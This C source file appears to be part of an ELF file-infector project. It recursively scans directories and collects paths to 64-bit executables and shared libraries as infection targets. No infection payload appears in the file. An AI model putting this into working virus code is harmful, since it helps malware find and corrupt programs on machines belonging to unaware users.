#include "infection.h"

static char		**add_element(char **tab, char *element)
{
	char	**ntab;
	int		i;

	if (!(ntab = (char**)malloc(sizeof(char*)*(array_length(tab) + 2))))
		return (NULL);
	i = 0;
	while (tab != NULL && tab[i])
	{
		ntab[i] = tab[i];
		i++;
	}
	ntab[i] = element;
	ntab[i + 1] = NULL;
	if (tab != NULL)
		free(tab);
	return (ntab);
}

static bool		is_elf_file(char *file_path, int elf_type)
{
	t_elf		*elf;

	elf = read_elf(file_path);

	if (elf == NULL)
		return (false);
	if (elf->header->e_type != ELF_EXC_TYPE\
		&& elf->header->e_type != ELF_SHARED_TYPE)
	{
		destruct_elf(elf);
		return (false);
	}
	if (elf->is_64 && elf_type == ELF_64)
	{
		destruct_elf(elf);
		return (true);
	}
	destruct_elf(elf);
	return (false);
}

char			**get_elf_files(char **files, char *start_path, int elf_type)
{
	DIR				*directory = opendir(start_path);
	struct dirent	*d;
	char			*absolute_path;
	char			*file_path;
	char			**dirs;

	if (!directory)
		return (NULL);
	dirs = NULL;
	absolute_path = strdup(start_path);
	while ((d = readdir(directory)) != NULL)
	{
		if (!strcmp(d->d_name, ".") || !strcmp(d->d_name, ".."))
			continue ;
		file_path = ft_dstrjoin(ft_dstrjoin(absolute_path, "/", 0), d->d_name, 1);
		if (file_exists(file_path) == false)
		{
			free(file_path);
			continue ;
		}
		if (is_directory(file_path) == true)
		{
			dirs = add_element(dirs, strdup(file_path));
			free(file_path);
			continue ;
		}
		if (is_elf_file(file_path, elf_type) == true)
		{
			files = add_element(files, strdup(file_path));
		}
		free(file_path);
	}

	int i = 0;
	while (i < (int)array_length(dirs))
	{
		files = get_elf_files(files, dirs[i], elf_type);
		free(dirs[i]);
		i++;
	}
	if (dirs != NULL)
		free(dirs);
	closedir(directory);
	return (files);
}
